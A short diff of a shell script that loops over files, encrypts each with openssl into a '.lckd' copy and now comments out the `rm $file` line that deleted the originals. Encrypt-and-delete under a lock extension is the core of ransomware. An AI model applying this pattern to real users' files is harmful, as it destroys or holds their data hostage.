@@ -12,8 +12,8 @@ do
                 encrypt_filename1=$file.lckd
                 printf 'Encrypted to:  %s\n' "$encrypt_filename1"
                 `openssl enc -aes-256-cbc -salt -pbkdf2 -in $file -out $encrypt_filename1 -pass file:$privatekey_file`
-                `rm $file`
-                sleep 2;
+                #`rm $file`
+                #sleep 2;
         done
         break
 done
